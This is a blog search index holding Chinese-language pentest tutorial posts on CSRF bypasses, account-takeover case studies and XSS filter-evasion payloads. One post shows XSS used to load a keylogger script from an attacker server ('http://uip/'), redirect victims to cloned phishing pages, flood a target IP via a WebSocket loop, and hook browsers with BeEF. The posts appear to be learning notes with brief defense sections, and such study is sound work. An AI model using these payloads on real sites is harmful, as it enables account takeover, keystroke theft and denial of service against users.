<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSRF_bypass和案例</title>
      <link href="/2019/12/05/CSRF_2/"/>
      <url>/2019/12/05/CSRF_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=29713635&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>1.<strong>使用其他人的CSRF令牌</strong></p><p>&#8195;当应用程序不验证csrf令牌是否绑定到这个账户时，可以自己尝试去验证这一点：首先用账户a登录到网站，转到密码更改页面，使用burp抓取csrf令牌。使用账户B登录网站，并修改账户B的密码，在修改时抓包修改csrf令牌，如果成功就证明可以使用他人的csrf令牌。</p><p>2.<strong>替换相同长度的值</strong></p><p>&#8195;首先我们先确定令牌的长度，例如长度为21个字符，令牌为<code>ud019eh10923213213123</code>,我们可以替换为具有相同值的令牌<code>ud019eh10832121321223</code></p><p>3.<strong>删除CSRF令牌</strong></p><p>&#8195;尝试进行敏感操作的时候把令牌删掉，看看是否可以操作成功。</p><p>5.<strong>使用令牌固定部分</strong></p><p>&#8195;对比两个csrf令牌，相同部分为固定的，反之为动态部分，通常情况下只要固定部分为正确的就可以使用这个令牌</p><p>6.<strong>改变请求方式</strong></p><p>&#8195;例如我们在修改密码的时候是Get请求，那么我们在伪造请求的时候，就通过Post的方式发送。</p><p>7.<strong>绕Referer</strong></p><p>&#8195;web应用程序有的时候会验证referer，例如目标网站叫<code>www.abc.com</code>，我们就可以创建一个目录叫<code>www.abc.com</code>，这样的话就有可能绕过验证</p><p>&#8195;也可以尝试删除referer</p><p>8.<strong>xss+csrf</strong></p><p>&#8195;利用xss去获取令牌，然后进行csrf攻击</p><p>9.<strong>CLRF+CSRF</strong></p><p>&#8195;利用CLRF漏洞去固定cookie，然后进行csrf攻击</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.<strong>通过两个漏洞进行账户接管</strong></p><p>&#8195;现在假设uri为<code>example.com</code>,我们在这个网站上发现可以添加电子邮箱，可利用此邮箱接收重置密码链接。现在我们尝试添加邮箱时删除csrf令牌，看是否可以添加成功，果然，尽管没有csrf令牌，也是可以添加成功的，现在我们就可以构造payload，当用户访问，就可以更改邮箱了，但是我们发现，在成功修改后会提示修改成功，这样我们就暴露了，经过一番研究后发现，当我们修改邮箱时，uri为：<code>https://www.example.com/account/addEmail?email_ref=A3Ig_klkdfnw&amp;st=2E67C2F5B0AF8DE90&amp;redirect_url=email_settings</code>当我们把参数<code>redirect_url=email_settings</code>更改为<code>redirect_url=home</code>后，添加完邮箱就会跳转到主页，这样我们就不会暴露了，所以我们只需要把这两个漏洞结合在一起就可以完成一次完美的攻击了</p><p>2.<strong>csrf导致的账户接管</strong></p><p>&#8195;此csrf漏洞是在绑定电子邮箱和账户名处，从而导致账户接管，作者发现在修改邮箱时会验证csrf令牌，如果删除就会失败，当他把这个post请求改为get请求后，就能成功绕过，这样的话只要任意用户访问我们的恶意链接，我们就可以修改他的邮箱，和用户名，这看起来很简单，但是他获得了2400美金</p><p>3.<strong>XSS与CSRf的利用，导致账户接管</strong></p><p>&#8195;首先是发现了一个<code>self-xss</code>，然后发现修改密码处需要csrf令牌，作者通过self-xss窃取csrf令牌，并同时写入到csrf payload 页面，并跳转过去，这样的话就可以成功的修改密码</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/</code></p><p><code>https://shahmeeramir.com/methods-to-bypass-csrf-protection-on-a-web-application-3198093f6599</code></p><p><code>https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee</code></p><p><code>https://medium.com/@sherazkhalid_60362/account-takeover-by-chaining-two-vulnerabilities-bb447753b089</code></p><p><code>https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/?__cf_chl_jschl_tk__=e0ddfe35f9fb4ef32043413ca483e9b149455471-1575553647-0-AeSewmjyKNq9ZRBYRR5iIan4ybMNYpiYyWMVRIl8YVutVTQTrcu1YKrPp8HPfMHGgTGxokpcwpijA1sUjUCpWaw_ibLemtVW338Gre0CyqBEEUlCbhQsVLA3DkwVeqtQTSoOu25DWzVNWKdhPbrnV5P6XHuDncrcwYlcW5C-c1Hz6Xv_nyyUcyGtDKqKhxwinGRSOt9de8YC3DRIgCu5NUEulQ18Q06qxXDgO-lQjDArIRNLoOreXoEJUiUdyVGnLPSzfJL7F4dj8yzzqLYj5FzKh-YUdlfXtV-B3_kNiM79g7nOZ6Y9TFD3EmCJtyVyLw</code></p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_1</title>
      <link href="/2019/12/05/CSRF_1/"/>
      <url>/2019/12/05/CSRF_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1301909440&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;当web应用没有对用户的一些敏感操作（修改密码，添加用户等）进行二次验证，导致攻击者可以构造恶意文件或链接，当用户在存在漏洞网站的认证<code>身份信息没有失效时</code>，访问了恶意链接，就会在受害者不执行的情况下，以受害者的身份向服务器发送请求，完成一些非法操作的攻击行为。</p><p>&#8195;没明白的小伙伴请看下面的图解</p><p><img src="/images/csrf.png" alt="csrf"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>&#8195;1.<strong>修改密码</strong></p><p>&#8195;&#8195;当我们在修改密码的时候，发现url中存在我们输入的密码（有的时候是post传输的，所有需要抓包观察）</p><p><img src="/images/csrfmi.png" alt="csrf"></p><p>&#8195;&#8195;我们尝试修改一下url中密码</p><p><img src="/images/csrfmi1.png" alt="csrf"></p><p>&#8195;&#8195;访问后发现提示密码修改了</p><p><img src="/images/csrfmi2.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们可以创建一个1.html文件</p><p><img src="/images/csrfmi3.png" alt="csrfmi2"></p><p>&#8195;&#8195;当用户访问到该页面就会被修改密码，他还不知道！！</p><p>&#8195;2.<strong>添加管理员</strong></p><p>&#8195;&#8195;espcmsv5版本后台有个添加管理员</p><p><img src="/images/csrft.png" alt="csrfmi2"></p><p>&#8195;&#8195;我尝试添加一个用户，并抓包分析，发现是通过post传输的，所以我们需要构建一个表单来完成此次攻击</p><p><img src="/images/csrft1.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们来创建一个esp1.html</p><p><img src="/images/csrft2.png" alt="csrfmi2"></p><p>&#8195;&#8195;当管理员访问后，就会成功添加管理员用户</p><p><img src="/images/csrft3.png" alt="csrfmi2"></p><p><code>其实不光这两种利用方式，像添加文件啊，转账啊，凡事用户的敏感操作没有进行二次验证的都有可能受到攻击</code></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;验证referer字段</p><p>&#8195;添加一次性且随机的token</p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_案例</title>
      <link href="/2019/12/03/XSS_2/"/>
      <url>/2019/12/03/XSS_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1312925425&auto=0&height=66"></iframe><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><p>1.上传html文件</p><p>&#8195;文件内容为xss的payload</p><p>&#8195;<code>&lt;svg/onload=alert(1)&gt;</code></p><p>&#8195;上传成功后去访问就会触发</p><p>2.上传svg文件</p><p>&#8195;svg文件内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>&#8195;同样只要能访问到就可以触发</p><h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><p>1.一个有在线聊天的网站，发送的聊天内容为xss payload</p><p><img src="/images/xsschat.png" alt="xsschat"></p><p><img src="/images/xsschat2.png" alt="xsschat"></p><p>2.绕过XSS filter</p><p>&#8195;当输入简单的payload:</p><p>&#8195;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>&#8195;发现请求被WAF阻止，经过各种尝试发现，当输入：</p><p>&#8195;<code>o&lt;x&gt;nmouseover=alert&lt;x&gt;1//</code></p><p>&#8195;尖括号与之间的内容被删除，仅剩下<code>onmouseover=alert(1)//</code>并弹出一个xss</p><p>&#8195;这个案例的话就是测试一下waf会对我们输入的内容怎么处理，根据处理方式进行一种利用，进而绕过，当我们遇到一个xss点，一定要多尝试，不要输入俩payload就觉得服务器已经防的死死的，多尝试，多研究，终会绕过的。</p><p>3.错误页面反应的XSS</p><p>&#8195;假设我们现在访问了一段url</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=../../../../etc/passwd</code></p><p>&#8195;出现了以下错误页面</p><p><img src="/images/xssbc.png" alt="xssbc"></p><p>&#8195;我们可以发现，url中file=后面的内容在页面中显示了出来</p><p>&#8195;我们接着尝试插入html标记，测试一下有没有filter</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;h1&gt;asu</code></p><p><img src="/images/xssbc2.png" alt="xssbc"></p><p>&#8195;很显然，并没有filter,我们只需插入xss payload就可以了</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;img src=x onmouseover=alert(1)&gt;</code></p><p><img src="/images/xssbc3.png" alt="xssbc"></p><p>4.url的xss与google dork的故事</p><p>&#8195;假设目标网站是<code>www.example.com</code>，我们使用google <code>site:*.example.com inurl:redirect</code></p><p>&#8195;当我们找到名为<code>example.com/social?redirect=/somewhere</code>时可以尝试<code>Open redirect</code>或XSS</p><p>&#8195;当重定向到白名单url成功后，就可以尝试xss：<code>example.com/social?redirect=javascript://alert(1)</code>,访问后可能会重定向别的地方，按正常用户流程走，可能会触发xss</p><p>&#8195;这个案例就是说我们拿到一个网站后，用google dork一下，发现open redirect 的点后，就在redirect后面添加</p><p>&#8195;简单的javascript urI：<code>javascript://alert(1)</code>去尝试一下。</p><p>5.绕过filter</p><p>&#8195;当网站把<code>&quot;&quot;</code>过滤为<code>&quot;</code>,把<code>&gt;</code>过滤为<code>&amp;gt</code>，我们的payload中就不能使用符号<code>&quot; &lt; &gt;</code></p><p>&#8195;我们就得一点点尝试，然后看<code>response</code>什么样，根据响应结果来修改payload</p><p>&#8195;当payload:时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=&apos;)&#125;hello&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/xssf.png" alt="xssf"></p><p>&#8195;当payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);</span><br></pre></td></tr></table></figure><p><img src="/images/xssf1.png" alt="xssf"></p><p>&#8195;这里没有触发是因为<code>&#39;)</code>未闭合，所有我们再修改一下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a= 1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);(‘</span><br></pre></td></tr></table></figure><p><img src="/images/xssf2.png" alt="xssf"></p><p><img src="/images/xssf3.png" alt="xssf"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是内句话，遇到waf要多尝试，1小时不行就2小时，2小时不行就3小时，不要随便试试就放弃</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脚本收集</title>
      <link href="/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="此贴不定时更新一些有用的小脚本小工具"><a href="#此贴不定时更新一些有用的小脚本小工具" class="headerlink" title="此贴不定时更新一些有用的小脚本小工具"></a>此贴不定时更新一些有用的小脚本小工具</h1><p><code>https://github.com/gwen001/pentest-tools/blob/master/dnsexpire.py</code> 此脚本可检测域名到期时间，可利用此脚本检测子域名接管。</p>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS bypass</title>
      <link href="/2019/12/02/XSS%20bypass/"/>
      <url>/2019/12/02/XSS%20bypass/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=27890306&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码</p><p><img src="/images/xssbp.png" alt></p><p>&#8195;2.大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;  ————》 &lt;sCriPt&gt;AlERt(1)&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure><p>&#8195;3.空格回车Tab</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.拆分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.Unicode编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert进行Unicode编码后\u0061\u006c\u0065\u0072\u0074</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;6.不使用括号</p><p>有的时候我们的（）会被过滤掉，那么我们就可以用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;  //这个在chrome里会出现一个uncaught错误，我们可以使用一下payload</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;7.不使用&lt;&gt;</p><p>当输入点在input便签里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;XSStest&quot; type=text&gt;</span><br><span class="line">可以尝试</span><br><span class="line">&quot; autofocus onfocus=alert(1)//</span><br></pre></td></tr></table></figure><p>bypass的方式有很多，我就不一一列举了，可以尝试使用下面的payload去fuzz一下</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_利用</title>
      <link href="/2019/11/25/XSS_1/"/>
      <url>/2019/11/25/XSS_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1300527847&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="/images/xsslc.jpg" alt></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&#8195;反射型</p><p>&#8195;&#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发</p><p>&#8195;存储型</p><p>&#8195;&#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发</p><p>&#8195;DOM型</p><p>&#8195;&#8195;这是一种特殊类型的反射型xss，基于DOM文档对象模型的一种漏洞</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>&#8195;1.盗取cookie</p><p>&#8195;2.网页钓鱼</p><p>&#8195;&#8195;可使用setookit这个工具克隆网站，然后插入payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.location=&quot;http://uip/&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;当用户访问到存在漏洞的页面，就会跳转到你克隆的页面，输入的内容会在服务器上显示</p><p>&#8195;3.键盘记录</p><p>&#8195;&#8195;在咱们自己的服务器网站根目录下创建Keylogger.js文件</p><p><img src="/images/keylogger.png" alt="keylogger"></p><p>&#8195;&#8195;再创建keylogger.php文件，并保存在同一个目录下。</p><p><img src="/images/keyloggerphp.png" alt="keyloggerphp"></p><p>&#8195;&#8195;接着创建一个空的keylog.txt文件，并赋予其相应的可写权限。</p><p>&#8195;&#8195;在存在漏洞的网站插入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://uip/Keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.DOS攻击</p><p>&#8195;如果你发现存储型的xss，并把这段恶意代码插入到目标网站，只要有用户访问到这个点，就会主动去请求连接要攻击的ip地址，站小流量小的话没啥危害，要是内种流量很大的网站，对目标ip会有很大的危害。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript”&gt;</span><br><span class="line"></span><br><span class="line">while (true)&#123; </span><br><span class="line"></span><br><span class="line">var ws = new WebSocket(&quot;ws://要攻击的IP地址:端口”);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.利用beef软件进行攻击</p><p>&#8195;&#8195;首先我们开启beef，第一个标红处的代码需要你把他插入的目标网站，第二段标红处需要你自己访问</p><p><img src="/images/xssbeef.png" alt="xssbeef"></p><p>&#8195;当有人访问了存在xss的页面后，我们的beef就会显示出来</p><p><img src="/images/xssbeef1.png" alt="xssbeef"></p><p>&#8195;这个<code>logs</code>里记录的是用户鼠标键盘的一些操作：</p><p><img src="/images/xssbeef2.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Details</code> 里记录的是对方的操作系统、浏览器版本、cookie等信息</p><p><img src="/images/xssbeef3.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Commands</code>里是可以发送命令给主机，英文看不懂的自行翻译</p><p><img src="/images/xssbeef4.png" alt="xssbeef"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;开启HttpOnly</p><p>&#8195;输入过滤 输出编码</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
